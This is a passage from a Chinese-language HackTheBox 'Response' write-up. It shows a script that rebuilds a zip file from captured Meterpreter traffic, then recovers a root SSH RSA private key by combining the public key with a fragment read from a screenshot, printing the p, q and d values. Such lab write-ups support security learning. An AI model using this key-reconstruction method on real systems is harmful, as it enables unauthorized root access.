class="string">&#x27;big&#x27;</span>)</span><br><span class="line">        v = tlv_data[j+8:j+l]</span><br><span class="line">        <span class="keyword">if</span> t == 0x20001: <span class="comment">#COMMAND_ID</span></span><br><span class="line">            v = cmd_ids[int.from_bytes(v[:4], <span class="string">&#x27;big&#x27;</span>)]</span><br><span class="line">        <span class="keyword">elif</span> t == 0x40034: <span class="comment">#CHANNEL_DATA</span></span><br><span class="line">            with open(<span class="string">&#x27;docs_backup.zip&#x27;</span>, <span class="string">&#x27;ab&#x27;</span>) as f:</span><br><span class="line">                f.write(v)</span><br><span class="line">        <span class="keyword">if</span> len(v) &gt; 50:</span><br><span class="line">            v = v[:50]</span><br><span class="line">        <span class="built_in">print</span>(f<span class="string">&quot;TLV l=&#123;l:&lt;8&#125; t=&#123;tlv_types[t]:&lt;26&#125; v=&#123;v&#125;&quot;</span>)</span><br><span class="line">        j += l</span><br><span class="line">    </span><br><span class="line">    i += 24 + packet_len</span><br></pre></td></tr></table></figure>

<h1 id="破碎ssh-key-复原"><a href="#破碎ssh-key-复原" class="headerlink" title="破碎ssh key 复原"></a>破碎ssh key 复原</h1><h2 id="检查-docs-backup-zip"><a href="#检查-docs-backup-zip" class="headerlink" title="检查 docs_backup.zip"></a>检查 docs_backup.zip</h2><p>zip文件有一个Documents文件夹的备份:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">kali@hacky$ zipinfo docs_backup.zip </span><br><span class="line">Archive:  docs_backup.zip</span><br><span class="line">Zip file size: 1274538 bytes, number of entries: 6</span><br><span class="line">drwxr-xr-x  3.0 unx        0 bx stor 22-Mar-14 09:37 Documents/</span><br><span class="line">-rw-rw-r--  3.0 unx      245 tx defN 22-Mar-14 09:37 Documents/.tmux.conf</span><br><span class="line">-rw-rw-r--  3.0 unx  1278243 bx defN 22-Jun-15 11:37 Documents/Screenshot from 2022-06-15 13-37-42.png</span><br><span class="line">-rw-rw-r--  3.0 unx       95 tx defN 22-Mar-14 09:37 Documents/.vimrc</span><br><span class="line">-rw-------  3.0 unx     1522 tx defN 22-Mar-14 08:57 Documents/bookmarks_3_14_22.html</span><br><span class="line">-rw-------  3.0 unx      567 tx defN 22-Mar-14 09:36 Documents/authorized_keys</span><br><span class="line">6 files, 1280672 bytes uncompressed, 1273444 bytes compressed:  0.6%</span><br></pre></td></tr></table></figure>

<p>authorized_keys文件在Response上只有root用户的公钥。它本身用处不大。bookmarks_3_14_22.html文件有几个指向twitter页面和另一个黑客网站的链接。.tmux.conf或.vimrc文件中没有任何有价值的内容。</p>
<p>截图很有趣:</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/response7.png"></li>
</ul>
<p>它是用户的Ubuntu桌面，有Response站点，文件管理器，一些更新，还有一个终端。有趣的是，终端有一个私有SSH密钥的结尾:</p>
<h2 id="RSA背景"><a href="#RSA背景" class="headerlink" title="RSA背景"></a>RSA背景</h2><p>一般来说，有一些与RSA相关的变量。</p>
<ul>
<li><p>从随机质数p和q开始。</p>
</li>
<li><p>N &#x3D; p * q， φ &#x3D; (p-1) * (q-1)。</p>
</li>
<li><p>E是一个大于1但小于φ的数。它几乎总是设置为0x10001(65537)。</p>
</li>
<li><p>D是e mod φ的模乘逆。这听起来很复杂，但这只是一行Python代码。</p>
</li>
</ul>
<p>要加密一条消息，m，你要把它转换成一个整数，加密后的整数是m^e mod n。要解密，用c^d mod n，就是这样。</p>
<p>SSH公钥格式将在<span class="exturl" data-url="aHR0cHM6Ly93d3cucmZjLWVkaXRvci5vcmcvcmZjL3JmYzQyNTMjc2VjdGlvbi02LjY=">RFC4253 section 6.6<i class="fa fa-external-link-alt"></i></span>中讨论。通常，公钥有三个字段:</p>
<ul>
<li>密钥类型</li>
<li>base64编码的值团</li>
<li>注释(通常是用户的电子邮件地址)</li>
</ul>
<p>定义了值blob的ssh-rsa格式:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">The <span class="string">&quot;ssh-rsa&quot;</span> key format has the following specific encoding:</span><br><span class="line"></span><br><span class="line">string    <span class="string">&quot;ssh-rsa&quot;</span></span><br><span class="line">mpint     e</span><br><span class="line">mpint     n</span><br></pre></td></tr></table></figure>

<p>key中的每一项都是[4 byte length][value]的形式。私钥结构不在RFC中，但在这篇<span class="exturl" data-url="aHR0cHM6Ly9kbmFlb24uZ2l0aHViLmlvL29wZW5zc2gtcHJpdmF0ZS1rZXktYmluYXJ5LWZvcm1hdC8=">博文<i class="fa fa-external-link-alt"></i></span>中描述为:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">;; AUTH_MAGIC is a hard-coded, null-terminated string,</span><br><span class="line">;; <span class="built_in">set</span> to <span class="string">&quot;openssh-key-v1&quot;</span>.</span><br><span class="line">byte[n] AUTH_MAGIC</span><br><span class="line"></span><br><span class="line">;; ciphername determines the cipher name (<span class="keyword">if</span> any),</span><br><span class="line">;; or is <span class="built_in">set</span> to <span class="string">&quot;none&quot;</span>, when no encryption is used.</span><br><span class="line">string   ciphername</span><br><span class="line"></span><br><span class="line">;; kdfname determines the KDF <span class="keyword">function</span> name, <span class="built_in">which</span> is</span><br><span class="line">;; either <span class="string">&quot;bcrypt&quot;</span> or <span class="string">&quot;none&quot;</span></span><br><span class="line">string   kdfname</span><br><span class="line"></span><br><span class="line">;; kdfoptions field.</span><br><span class="line">;; This one is actually a buffer with size determined by the</span><br><span class="line">;; uint32 value, <span class="built_in">which</span> preceeds it.</span><br><span class="line">;; If no encryption was used to protect the private key,</span><br><span class="line">;; it<span class="string">&#x27;s contents will be the [0x00 0x00 0x00 0x00] bytes (empty string).</span></span><br><span class="line"><span class="string">;; You should read the embedded buffer, only if it&#x27;</span>s size is</span><br><span class="line">;; different than 0.</span><br><span class="line">uint32 (size of buffer)</span><br><span class="line">    string salt</span><br><span class="line">    uint32 rounds</span><br><span class="line"></span><br><span class="line">;; Number of keys embedded within the blob.</span><br><span class="line">;; This value is always <span class="built_in">set</span> to 1, at least <span class="keyword">in</span> the</span><br><span class="line">;; current implementation of the private key format.</span><br><span class="line">uint32 number-of-keys</span><br><span class="line"></span><br><span class="line">;; Public key section.</span><br><span class="line">;; This one is a buffer, <span class="keyword">in</span> <span class="built_in">which</span> the public key is embedded.</span><br><span class="line">;; Size of the buffer is determined by the uint32 value,</span><br><span class="line">;; <span class="built_in">which</span> preceeds it.</span><br><span class="line">;; The public components below are <span class="keyword">for</span> RSA public keys.</span><br><span class="line">uint32 (size of buffer)</span><br><span class="line">    string keytype (<span class="string">&quot;ssh-rsa&quot;</span>)</span><br><span class="line">    mpint  e       (RSA public exponent)</span><br><span class="line">    mpint  n       (RSA modulus)</span><br><span class="line"></span><br><span class="line">;; Encrypted section</span><br><span class="line">;; This one is a again a buffer with size</span><br><span class="line">;; specified by the uint32 value, <span class="built_in">which</span> preceeds it.</span><br><span class="line">;; The fields below are <span class="keyword">for</span> RSA private keys.</span><br><span class="line">uint32 (size of buffer)</span><br><span class="line">    uint32  check-int</span><br><span class="line">    uint32  check-int  (must match with previous check-int value)</span><br><span class="line">    string  keytype    (<span class="string">&quot;ssh-rsa&quot;</span>)</span><br><span class="line">    mpint   n          (RSA modulus)</span><br><span class="line">    mpint   e          (RSA public exponent)</span><br><span class="line">    mpint   d          (RSA private exponent)</span><br><span class="line">    mpint   iqmp       (RSA Inverse of Q Mod P, a.k.a iqmp)</span><br><span class="line">    mpint   p          (RSA prime 1)</span><br><span class="line">    mpint   q          (RSA prime 2)</span><br><span class="line">    string  comment    (Comment associated with the key)</span><br><span class="line">    byte[n] padding    (Padding according to the rules above)</span><br></pre></td></tr></table></figure>

<p>这里还有很多! 私钥包括公钥，也包括d、p、q。</p>
<h2 id="Recover-Key"><a href="#Recover-Key" class="headerlink" title="Recover Key"></a>Recover Key</h2><p>现在假设authorized_keys文件中的公钥与屏幕截图中的部分私钥配对。因为只有部分私钥，所以将从公钥开始:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/response/doc_backup]</span><br><span class="line">└─<span class="comment"># cat authorized_keys | cut -d&#x27; &#x27; -f2 | base64 -d | hexdump -C</span></span><br><span class="line">00000000  00 00 00 07 73 73 68 2d  72 73 61 00 00 00 03 01  |....ssh-rsa.....|</span><br><span class="line">00000010  00 01 00 00 01 81 00 9e  3a 2c fb b9 52 5a d7 f1  |........:,..RZ..|</span><br><span class="line">00000020  b2 ea 97 a9 03 af 1b 4f  69 e5 33 61 3a 78 d5 51  |.......Oi.3a:x.Q|</span><br><span class="line">00000030  2e 9a 08 94 dc 91 7a 94  24 e8 de d3 90 14 b2 9d  |......z.$.......|</span><br><span class="line">00000040  04 a1 a1 97 ac 07 22 76  83 7a 53 89 65 d9 22 b6  |......<span class="string">&quot;v.zS.e.&quot;</span>.|</span><br><span class="line">00000050  8f f3 4b a9 29 bd 45 be  f2 d3 ed b5 88 1f b6 2b  |..K.).E........+|</span><br><span class="line">00000060  cc 11 ef b6 30 08 af 2b  a1 <span class="built_in">df</span> 96 79 8b fa f0 69  |....0..+...y...i|</span><br><span class="line">00000070  d4 14 02 9a 1d 3d 2c fe  c0 c6 10 69 89 b7 66 54  |.....=,....i..fT|</span><br><span class="line">00000080  49 07 3f 14 96 4a 12 38  f0 bd 7d 45 6b ac ca 11  |I.?..J.8..&#125;Ek...|</span><br><span class="line">00000090  50 88 ee 7e 6d f8 c2 90  4d b7 3c 6d ed f7 1b 11  |P..~m...M.&lt;m....|</span><br><span class="line">000000a0  95 f3 be 37 d7 8e 8b f9  b6 42 a0 39 1f 67 f9 89  |...7.....B.9.g..|</span><br><span class="line">000000b0  02 96 ab 76 64 eb 3e cc  dc 90 39 ea 73 58 5a 5d  |...vd.&gt;...9.sXZ]|</span><br><span class="line">000000c0  5b 61 7c f0 <span class="built_in">dd</span> 9b e6 59  bd <span class="built_in">df</span> 6e 70 78 93 30 f4  |[a|....Y..npx.0.|</span><br><span class="line">000000d0  c1 81 94 72 78 cb 6e 68  d6 d8 7b af de 2a 01 e8  |...rx.nh..&#123;..*..|</span><br><span class="line">000000e0  05 08 8b 9a 13 8f cb 5e  31 f2 5d 83 45 cc 86 1b  |.......^1.].E...|</span><br><span class="line">000000f0  a7 bc 98 29 c1 05 9f 3f  09 ad 1a 05 78 07 7b ba  |...)...?....x.&#123;.|</span><br><span class="line">00000100  1a 90 26 2f 99 1e 23 d1  7d 20 08 c5 af ef 40 e6  |..&amp;/..<span class="comment">#.&#125; ....@.|</span></span><br><span class="line">00000110  40 37 99 0b ca 14 8f ec  2b e0 a5 dc 3c 11 a5 94  |@7......+...&lt;...|</span><br><span class="line">00000120  83 16 4e 84 9e d4 b3 85  6e 66 b2 5f 47 bd d3 bb  |..N.....nf._G...|</span><br><span class="line">00000130  25 07 c2 40 05 2d 46 53  f0 4a e8 bd 36 ce 22 94  |%..@.-FS.J..6.<span class="string">&quot;.|</span></span><br><span class="line"><span class="string">00000140  85 97 0d 60 7e 13 4e 50  ee fc c2 07 3b f2 77 8b  |...`~.NP....;.w.|</span></span><br><span class="line"><span class="string">00000150  2a ae 6a a3 cf 0c 46 07  52 f4 19 08 91 ce 78 9c  |*.j...F.R.....x.|</span></span><br><span class="line"><span class="string">00000160  1e 1d 09 91 d2 aa ba e7  0e 1c c6 1b c3 0d 12 11  |................|</span></span><br><span class="line"><span class="string">00000170  87 88 25 b6 35 43 e3 79  9d 83 f2 f1 e7 1a 7f 97  |..%.5C.y........|</span></span><br><span class="line"><span class="string">00000180  21 08 72 dc 12 c3 3d 62  91 e6 8e 05 d6 f0 8b e8  |!.r...=b........|</span></span><br><span class="line"><span class="string">00000190  05 ff a2 e7 f5 49 51                              |.....IQ|</span></span><br><span class="line"><span class="string">00000197</span></span><br></pre></td></tr></table></figure>

<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/response8.png"></li>
</ul>
<p>在这里突出显示了三个 长度-值 对:</p>
<ul>
<li><p>密钥格式[橙色] - 7字节，”ssh-rsa”</p>
</li>
<li><p>E[蓝色] - 3字节，0x010001</p>
</li>
<li><p>N[黄色] - 0x181字节，big int</p>
</li>
</ul>
<p>现在可以写一个小脚本解析这个文件获取n，e:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse_pubkey</span>(<span class="params">pk</span>):</span><br><span class="line">	keytype_len = <span class="built_in">int</span>.from_bytes(pk[:<span class="number">0x4</span>], <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">	keytype = pk[<span class="number">0x4</span>:<span class="number">0x4</span>+keytype_len]</span><br><span class="line">	pk = pk[<span class="number">0x4</span>+keytype_len:]</span><br><span class="line">	e_len = <span class="built_in">int</span>.from_bytes(pk[:<span class="number">0x4</span>], <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">	e = <span class="built_in">int</span>.from_bytes(pk[<span class="number">0x4</span>:<span class="number">0x4</span>+e_len], <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">	pk = pk[<span class="number">0x4</span>+e_len:]</span><br><span class="line">	n_len = <span class="built_in">int</span>.from_bytes(pk[:<span class="number">0x4</span>], <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">	n = <span class="built_in">int</span>.from_bytes(pk[<span class="number">0x4</span>:<span class="number">0x4</span>+n_len], <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line"></span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&#x27;keytype = %s&#x27;</span> % keytype.decode())</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&#x27;e = 0x%x&#x27;</span> % e)</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&#x27;N = 0x%x&#x27;</span> % n)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">len</span>(sys.argv) &lt; <span class="number">2</span>):</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&#x27;usage:\n %s &lt;pubkey file&gt;&#x27;</span> % sys.argv[<span class="number">0</span>])</span><br><span class="line">	quit()</span><br><span class="line"></span><br><span class="line">d = <span class="built_in">open</span>(sys.argv[<span class="number">1</span>], <span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">pk = b64decode(d.split(<span class="string">b&#x27; &#x27;</span>)[<span class="number">1</span>])</span><br><span class="line">parse_pubkey(pk)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/response/doc_backup]</span><br><span class="line">└─<span class="comment"># python parse_pubkey.py authorized_keys                      </span></span><br><span class="line">keytype = ssh-rsa</span><br><span class="line">e = 0x10001</span><br><span class="line">N = 0x9e3a2cfbb9525ad7f1b2ea97a903af1b4f69e533613a78d5512e9a0894dc917a9424e8ded39014b29d04a1a197ac072276837a538965d922b68ff34ba929bd45bef2d3edb5881fb62bcc11efb63008af2ba1df96798bfaf069d414029a1d3d2cfec0c6106989b7665449073f14964a1238f0bd7d456bacca115088ee7e6df8c2904db73c6dedf71b1195f3be37d78e8bf9b642a0391f67f9890296ab7664eb3eccdc9039ea73585a5d5b617cf0dd9be659bddf6e70789330f4c181947278cb6e68d6d87bafde2a01e805088b9a138fcb5e31f25d8345cc861ba7bc9829c1059f3f09ad1a0578077bba1a90262f991e23d17d2008c5afef40e64037990bca148fec2be0a5dc3c11a59483164e849ed4b3856e66b25f47bdd3bb2507c240052d4653f04ae8bd36ce229485970d607e134e50eefcc2073bf2778b2aae6aa3cf0c460752f4190891ce789c1e1d0991d2aabae70e1cc61bc30d1211878825b63543e3799d83f2f1e71a7f97210872dc12c33d6291e68e05d6f08be805ffa2e7f54951</span><br></pre></td></tr></table></figure>

<p>或者使用RsaCtfTool的–dumpkey和–publickey来dump key的值:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/response/doc_backup]</span><br><span class="line">└─<span class="comment"># python /root/RsaCtfTool-master/RsaCtfTool.py --publickey authorized_keys --dumpkey</span></span><br><span class="line">private argument is not <span class="built_in">set</span>, the private key will not be displayed, even <span class="keyword">if</span> recovered.</span><br><span class="line">Details <span class="keyword">for</span> authorized_keys:</span><br><span class="line">n: 3590773335101238071859307517426880690889840523373109884703778010764218094115323788644947218525265498470146994925454017059004091762707129955524413436586717182608324763300282675178894829982057112627295254493287098002679639669820150059440230026463333555689667464933204440020706407713635415638301509611028928080368097717646239396715845563655727381707204991971414197232171033109308942706448793290810366211969147142663590876235902557427967338347816317607468319013658232746475644358504534903127732182981965772016682335749548359468750099927184491041818321309183225976141161842377047637016333306802160159421621687348405702117650608558846929592531719185754360656942555261793483663585574756410582955655659226850666667278286719778179120315714973739946191120342805835285916572624918386794240440690417793816096752504556412306980419975786379416200263786952472798045196058762477056525870972695021604337904447201141677747670148003857478011217</span><br><span class="line">e: 65537</span><br></pre></td></tr></table></figure>

<p>至于私钥，首先需要从截图中获取文本。在OCR上部分字符识别错误，最后大部分都是用手输入:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ntEd3KnWNpkbwp28vVgasUOq3CQBbDOQAAAMEAxwsaGXCZwMb/JH88XvGhu1Bo2zomIhaV</span><br><span class="line">MrbN5x4q3c7Z0u9gmkXO+NWMpX7T20l0OBEIhrW6DQOsxis/CrS5u69F6tUZjlUdNE1zIE</span><br><span class="line">7IFv2QurMwNL89/SnlQbe24xb+IjafKUaOPsNcpFakP4vxnKL+uw6qFoqRdSZyndgArZKD</span><br><span class="line">K26Z7ZzdV2ln2kyiLfokN8WbYxHeQ/7/jVBXf71BU1+Xg8X44njVp3Xf9gO6cYVaqb1xBs</span><br><span class="line">Z7bG8Warkycj7ZAAAADXJvb3RAcmVzcG9uc2UBAgMEBQ==</span><br></pre></td></tr></table></figure>

<p>如果尝试Base64解码这一部分，将得到一个错误，这是因为它是在字节边界上切割的，这将使后面的所有数据都是错误的。Base64编码需要3个字节，输出4个字符。所以如果从这四个字符块的中间开始，就会出错。可以用A填充起始点，直到它被固定。每个A在前面加6个空位。在两个a之后，就不再有错误了。使用两个A字符作为填充:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/response/doc_backup]</span><br><span class="line">└─<span class="comment"># (echo -n AA;cat partial_key)|grep -v &#x27;-&#x27;|base64 -d|hexdump -C</span></span><br><span class="line">00000000  00 09 ed 11 <span class="built_in">dd</span> ca 9d 63  69 91 bc 29 db cb d5 81  |.......ci..)....|</span><br><span class="line">00000010  ab 14 3a ad c2 40 16 c3  39 00 00 00 c1 00 c7 0b  |..:..@..9.......|</span><br><span class="line">00000020  1a 19 70 99 c0 c6 ff 24  7f 3c 5e f1 a1 bb 50 68  |..p....$.&lt;^...Ph|</span><br><span class="line">00000030  db 3a 26 22 16 95 32 b6  <span class="built_in">cd</span> e7 1e 2a <span class="built_in">dd</span> ce d9 d2  |.:&amp;<span class="string">&quot;..2....*....|</span></span><br><span class="line"><span class="string">00000040  ef 60 9a 45 ce f8 d5 8c  a5 7e d3 db 49 74 38 11  |.`.E.....~..It8.|</span></span><br><span class="line"><span class="string">00000050  08 86 b5 ba 0d 03 ac c6  2b 3f 0a b4 b9 bb af 45  |........+?.....E|</span></span><br><span class="line"><span class="string">00000060  ea d5 19 8e 55 1d 34 4d  73 20 4e c8 16 fd 90 ba  |....U.4Ms N.....|</span></span><br><span class="line"><span class="string">00000070  b3 30 34 bf 3d fd 29 e5  41 b7 b6 e3 16 fe 22 36  |.04.=.).A.....&quot;</span>6|</span><br><span class="line">00000080  9f 29 46 8e 3e c3 5c a4  56 a4 3f 8b f1 9c a2 fe  |.)F.&gt;.\.V.?.....|</span><br><span class="line">00000090  bb 0e aa 16 8a 91 75 26  72 9d d8 00 ad 92 83 2b  |......u&amp;r......+|</span><br><span class="line">000000a0  6e 99 ed 9c <span class="built_in">dd</span> 57 69 67  da 4c a2 2d fa 24 37 c5  |n....Wig.L.-.<span class="variable">$7</span>.|</span><br><span class="line">000000b0  9b 63 11 de 43 fe ff 8d  50 57 7f bd 41 53 5f 97  |.c..C...PW..AS_.|</span><br><span class="line">000000c0  83 c5 f8 e2 78 d5 a7 75  <span class="built_in">df</span> f6 03 ba 71 85 5a a9  |....x..u....q.Z.|</span><br><span class="line">000000d0  bd 71 06 c6 7b 6c 6f 16  6a b9 32 72 3e d9 00 00  |.q..&#123;lo.j.2r&gt;...|</span><br><span class="line">000000e0  00 0d 72 6f 6f 74 40 72  65 73 70 6f 6e 73 65 01  |..root@response.|</span><br><span class="line">000000f0  02 03 04 05                                       |....|</span><br><span class="line">000000f4</span><br></pre></td></tr></table></figure>

<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/response9.png"></li>
</ul>
<p>注意前12位是我加的，所以这三个十六进制0。将扫描输出，寻找看起来可能是长度的4字节的块。如果是一个长度，那么下一个长度应该是后面这么多字节。这里有两点:</p>
<ul>
<li><p>p[紫色]的末尾 - 000不是一个部件，因为我添加了这个，之前没有关于大小的信息</p>
</li>
<li><p>Q[红色] - 0xc1字节，large int</p>
</li>
<li><p>注释[绿色] - 0xd字节，”root@response”，匹配公共注释。</p>
</li>
<li><p>Padding [tan]</p>
</li>
</ul>
<p>记住只选择c70b和3ed9之间的值，如上图中突出显示的那样。</p>
<p>从这里得到的唯一值是q，但这就是所需要的。在Python shell中进行计算，从恢复的三个值开始:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; n = 3590773335101238071859307517426880690889840523373109884703778010764218094115323788644947218525265498470146994925454017059004091762707129955524413436586717182608324763300282675178894829982057112627295254493287098002679639669820150059440230026463333555689667464933204440020706407713635415638301509611028928080368097717646239396715845563655727381707204991971414197232171033109308942706448793290810366211969147142663590876235902557427967338347816317607468319013658232746475644358504534903127732182981965772016682335749548359468750099927184491041818321309183225976141161842377047637016333306802160159421621687348405702117650608558846929592531719185754360656942555261793483663585574756410582955655659226850666667278286719778179120315714973739946191120342805835285916572624918386794240440690417793816096752504556412306980419975786379416200263786952472798045196058762477056525870972695021604337904447201141677747670148003857478011217</span><br><span class="line">&gt;&gt;&gt; e = 0x10001</span><br><span class="line">&gt;&gt;&gt; q = int(<span class="string">&#x27;c70b1a197099c0c6ff247f3c5ef1a1bb5068db3a2622169532b6cde71e2addced9d2ef609a45cef8d58ca57ed3db497438110886b5ba0d03acc62b3f0ab4b9bbaf45ead5198e551d344d73204ec816fd90bab33034bf3dfd29e541b7b6e316fe22369f29468e3ec35ca456a43f8bf19ca2febb0eaa168a917526729dd800ad92832b6e99ed9cdd576967da4ca22dfa2437c59b6311de43feff8d50577fbd41535f9783c5f8e278d5a775dff603ba71855aa9bd7106c67b6c6f166ab932723ed9&#x27;</span>, 16)</span><br></pre></td></tr></table></figure>

<p>通过n和q，可以计算出p:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; p = n//q</span><br><span class="line">&gt;&gt;&gt; <span class="built_in">print</span>(p)</span><br><span class="line">1916050306205333561419340654997247210048413641801348970960079514616664134719102135041323559808823287507117764495506641667502188027100449148337242917863760454705051745311589368966639723256790995465786349803085767646492327358529192956998140247230141324083433547842337416562412168069467780529408980611520951488107555503940773583448434212344944450737794180001456574166216535263941314645573920302378030613909969529154033431308763003703277642056872726635405506000634681</span><br><span class="line">&gt;&gt;&gt; p*q == n</span><br><span class="line">True</span><br></pre></td></tr></table></figure>

<p>现在计算φ:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; phi = (p-1)*(q-1)</span><br><span class="line">&gt;&gt;&gt; <span class="built_in">print</span>(phi)</span><br><span class="line">3590773335101238071859307517426880690889840523373109884703778010764218094115323788644947218525265498470146994925454017059004091762707129955524413436586717182608324763300282675178894829982057112627295254493287098002679639669820150059440230026463333555689667464933204440020706407713635415638301509611028928080368097717646239396715845563655727381707204991971414197232171033109308942706448793290810366211969147142663590876235902557427967338347816317607468319013658228956375725012986129862726232754859317683887903858009990384898592815614700937210104609413404646477835982769446642620001985573386135264174659566853632803857877843123634985205607857456627847123705219756960372119762762326915119400492083811597718754804423893011082806582970563249860226508474929593549697651100023590711018803530679241541686077829536630628187078798865270742866534980339315709884044330134828157994491187086808483649524106296755673106409592022829166774080</span><br></pre></td></tr></table></figure>

<p>然后 d:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; d = pow(e, -1, phi)</span><br><span class="line">&gt;&gt;&gt; <span class="built_in">print</span>(d)</span><br><span class="line">1625619800302939310497362620230641471210180025458598505869372927954809509931819534142478050164710428301711420105256888263738825436005928647640406894785051174267802855289674336215539460237234455828796713319435253333834397500702867880183585224913668715341142159155411076726343273522797240978201714911564891529128911291065564839717398383717067174500706045619907216257663831917133776799370366311218755291043602785034846595021426505315894699616700644573501762746772657477999721701257281734395644076425163734698782481150440433952442877142502354502400228287772035048863902967323525436554296229036523388132843269428678231998157309694954758549374935238691856877188975238247314353622551508912089241384258154784386155226013654968015424436833187537167598768732947206015220857044687732676136043773063354998578298201052105386854915970556061201166518041208286877828701272183657345433824458258168785722284819778518101546716703470060292326273</span><br></pre></td></tr></table></figure>

